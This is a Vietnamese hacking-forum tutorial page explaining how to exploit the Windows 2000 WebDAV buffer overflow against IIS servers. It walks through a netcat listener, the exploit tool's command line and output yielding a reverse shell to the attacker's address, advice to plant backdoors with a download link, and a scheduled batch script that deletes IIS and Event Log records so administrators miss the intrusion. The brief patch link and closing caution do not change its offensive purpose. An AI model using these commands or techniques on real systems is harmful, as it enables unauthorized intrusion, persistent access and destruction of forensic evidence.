<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta name="description" content="HVA Reading Room">
<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title> - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0" align="center">
	<tr>
        <td width="100%" align="center" valign="middle">
			<a href="" title="[Logo]"><img src="/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
		</td>
	</tr>

	<tr>
		<td>
<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">

		<tr height="15">
			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
		    <th class="thportal" align="center">
				<span class="readingheader">
					 Kỹ thuật khai thác WebDAV  <a name="topPage" id="topPage"></a>
				</span>
			</th>
		    <th class="thportal" align="right">
				<a href="/hvaonline/posts/list/0/1104.html#4646" target="_blank">
				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: Seamoun - Translator:  - Entry Date: 19/02/2009 13:19:58" title="Author: Seamoun - Translator:  - Entry Date: 19/02/2009 13:19:58"/>
			</th>
		</tr>
</table>

<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
		<tr>
		    <td align="left" colspan="2" class="readingborderBottom">
				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
					<tr>
						<td align="left">
							<div class="postbody"><b>Tác giả: Seamoun - HVAonline</b><br/> <br/> <b>1) Mô tả</b><br/> <br/> Giao thức World Wide Web Distributed Authoring and Versioning (WebDAV) là một tập hợp các mở rộng cho giao thức HTTP dùng để cung cấp một cách thức chuẩn cho việc biên tập và quản lý file giữa các máy tính trên Internet. Lỗi tràn bộ đệm đã được phát hiện trong một thành phần của Windows 2000 được sử dụng bởi WebDAV có thể cho phép kẻ tấn công chiếm quyền điều khiển máy tính<br/> <br/> <b>2) Khai thác</b><br/> <br/> Bạn sử dụng chương trình sau webdav của kralor có thể download lại địa chỉ www.coromputer.net<br/> Công việc chuẩn bị là download cái webdav đó về và đặt nc(NETCAT) ở chế độ lắng nghe ở máy tính dùng để tấn công.<br/> Ví dụ <br/> <br/> <blockquote>C:\&gt;nx -vv -l -p 53<br/> listening on [any] 53 ...&nbsp;<br/> 		</blockquote><br/>  <br/> <br/> Mục đích là listen ở cổng 53 là tưởng lửa không chặn cổng này<br/> Cú pháp webdav <IP của máy chủ IIS> <IP của máy tính dùng để tấn công> <cổng lắng nghe> [padding=1,2,3...]<br/> Ví dụ<br/> <br/> <blockquote>C:\&gt; webdav xxx.xxx.xxx.xxx 203.162.118.56 53 1<br/> [Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt]<br/> www.coromputer.net && undernet #coromputer<br/> <br/> Checking WebDav on 'xxx.xxx.xxx.xxx' ... FOUND<br/> exploiting ntdll.dll through WebDav [ret: 0x00100010]<br/> Connecting... CONNECTED<br/> Sending evil request... SENT<br/> Now if you are lucky you will get a shell.&nbsp;<br/> 		</blockquote> <br/> <br/> Nếu như may mắn bạn có thể có shell của máy chủ IIS<br/> Công đoạn khai thác khi đã có shell<br/> Nếu như ở máy tính dùng để tấn công hiện ra kết quả như sau thì bạn đã có shell rồi đó<br/> <br/> <blockquote>C:\&gt;nc -vv -l -p 53<br/> listening on [any] 53 ...<br/> connect to [203.162.118.56] from xxx.xxx.xxx.xxx[xxx.xxx.xxx.xxx] 1125<br/> Microsoft Windows 2000 [Version 5.00.2195]<br/> (C) Copyright 1985-2000 Microsoft Corp.&nbsp;<br/> 		</blockquote><br/> C:\WINNT\system32&gt;   &lt;-- OK đã thành công rùi. Hà hà đã quá !!!<br/>  <br/> <br/> <br/> Công đoạn tiếp theo là phải xoá dấu vết của mình. Để thuận tiện cho việc khai thác server các bạn nên up một số đồ nghề thông dụng để quá trình khai thác được dễ dàng hơn khi đã có shell. Mình thường dùng ps, reg, kill, rar, wg, ce ...<br/> Để thuận tiện cho lần sau viếng thăm server các bạn có thể đặt vài con backdoor. Ví dụ như WinShell, Hack Defensed<br/> Hoặc dùng backdoor của VICKI (VKDT) các you có thể download tại đây<span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://vicki.host.sk/tyt.zip</span></span></span></span></span></span></span></span></span></span></span><br/> <br/> + Tìm thư mục ghi nhật ký của máy chủ IIS<br/> Thực hiện truy vấn sau:<br/> <br/> <blockquote>C:\WINNT\system32&gt;reg query HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters /v LogFileDirectory<br/> ! REG.EXE VERSION 2.0 <br/> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters<br/> LogFileDirectory REG_SZ C:\WINNT\System32\LogFiles<br/> Thường thì file log lưu ở thu mục C:\WINNT\System32\LogFiles<br/>  &nbsp;<br/> 		</blockquote><br/> C:\WINNT\system32&gt;at<br/> The service has not been started. ' dịch vụ hẹn lịch đã bị admin vô hiệu<br/> <br/> C:\WINNT\system32&gt;net start schedule ' khởi động dịch vụ hẹn lịch<br/> net start schedule<br/> The Task Scheduler service is starting.<br/> The Task Scheduler service was started successfully.<br/> <br/> Thực hiện một kịch bản trên server bằng cách lưu tiến trình thực hiện vào một file .bat<br/> Công việc của mình gồm có:<br/> - Dừng máy chủ IIS<br/> - Xoá nhật kí của IIS<br/> - Khởi động lại IIS<br/> - Xoá nhật ký của Event Log<br/> - Xoá file sm.bat(file viết kịch bản khai thác. Hì hì)<br/> Mọi công việc thực hiện bằng các lệnh như sau<br/> <blockquote>C:\WINNT\system32&gt;echo iisreset /stop &gt;sm.bat ' dừng IIS<br/> C:\WINNT\system32&gt;echo rd /q /s C:\WINNT\System32\LogFiles &gt;&gt;sm.bat ' xóa nhật kí của IIS<br/> C:\WINNT\system32&gt;echo iisreset /start &gt;&gt;sm.bat ' khởi động lại IIS<br/> C:\WINNT\system32&gt;echo ce &gt;&gt;sm.bat ' xóa nhật kí của Event Log<br/> C:\WINNT\system32&gt;echo del sm.bat &gt;&gt;sm.bat ' xóa file sm.bat<br/> <br/> C:\WINNT\system32&gt;net time \\xxx.xxx.xxx.xxx ' lấy thời gian hiện tại của máy chủ<br/> Current time at \\xxx.xxx.xxx.xxx is 3/25/2003 3:00 PM<br/> <br/> The command completed successfully.<br/> <br/> C:\WINNT\system32&gt;at 15:05 sm.bat ' đặt lịch sau 5 phút nữa sẽ làm việc<br/> at 15:05 sm.bat<br/> Added a new job with job ID = 1<br/> <br/> C:\WINNT\system32&gt;exit ' đóng kết nối<br/> sent 207, rcvd 746&nbsp;<br/> 		</blockquote><br/> <br/> Như vậy mọi hành động của bạn thực hiện trên máy chủ IIS sẽ không bị ADMIN phát hiện. Hì hì. Nếu như các bạn để máy chủ tình trạng ngưng hoạt động chờ sự khởi động của ADMIN có thể dẫn đến ADMIN nghi ngờ có sự xâm nhập từ bên ngoài. Do vậy mình khuyên các bạn viết kịch bản khai thác như trên. Bạn nào nghĩ ra kịch bản hay hơn thì có thể gửi lên để mọi người cùng thảo luận !<br/> <b><br/> Bản sửa lỗi này tại </b><br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://microsoft.com/downloads/details.asp...&displaylang=en</span></span></span></span></span></span></span></span></span></span></span><br/> Chúc các bạn thành công !!! (Server Việt Nam patch hơi bị nhiều đấy các bạn chắc hổng khai thác được đâu mà nếu có khai thác được cái nào thì nên báo cho ADMIN biết về lỗi này. Các bạn đừng có quậy à nha !)<br/> <br/> <i>Tác giả: Seamoun - HVAonline</i><br/> <br/> </div>
						</td>
					</tr>

					<tr>
						<td align="left"><a href="http://digg.com/submit?phrase=2&url=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=/hvaonline/readingRoom/item/4646.html"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
					</tr>
				</table>
			</td>
		</tr>



		<tr>
			<td align="left" valign="top">
				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
				<a href="/hvaonline/posts/list/0/1104.html#4646" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
				&nbsp;
			</td>
			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Go to Category</option>	
						<option value="0">------------------------</option>	
								<option value="1">Defense</option>
								<option value="2">Exploit</option>
								<option value="3">Reverse Engineering</option>
								<option value="4">*nix</option>
								<option value="5">Windows</option>
								<option value="6">Networking</option>
								<option value="7">Others</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
		</tr>
</table>
<script type="text/javascript">
		var ctlTop = false;
		var ctlBt = false;

		function activateControllerTop()
		{
			ctlTop = !ctlTop;
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");

			if (ctlTop) {
				document.location = document.location + "#ctlTop";
			}
		}

		function activateControllerBottom()
		{
			ctlBt = !ctlBt;
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");

			if (ctlBt) {
				document.location = document.location + "#ctlBt";
			}
		}
</script>

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.html" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
